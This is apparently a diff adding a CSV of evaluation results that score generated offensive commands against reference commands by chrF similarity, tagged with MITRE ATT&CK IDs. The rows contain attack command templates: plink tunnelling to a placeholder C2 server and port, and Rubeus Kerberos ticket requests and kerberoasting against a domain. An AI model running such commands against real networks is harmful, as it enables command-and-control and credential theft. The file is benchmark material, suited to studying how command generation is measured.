@@ -1,0 +1,14 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_plink_TA0011_T1071.txt,plink,plink -shareexists <dns_tunnel_session>,"```sh
+plink -ssh #{user}@#{server}
+```",19.044,True
+command_plink_TA0011_T1071.txt,plink,plink -sshlog <dns_tunnel_log_file>,"```sh
+plink -ssh #{user}@#{server}
+```",22.935,True
+command_plink_TA0011_T1071.txt,plink,plink -share <dns_tunnel_session> -nc <c2_server>:<c2_port>,"```sh
+plink -ssh #{user}@#{server}
+```",19.635,True
+command_plink_TA0011_T1071.txt,plink,plink -sshrawlog <dns_tunnel_raw_log_file>,"```sh
+plink -ssh #{user}@#{server}
+```",20.301,True
+command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,14.269,True
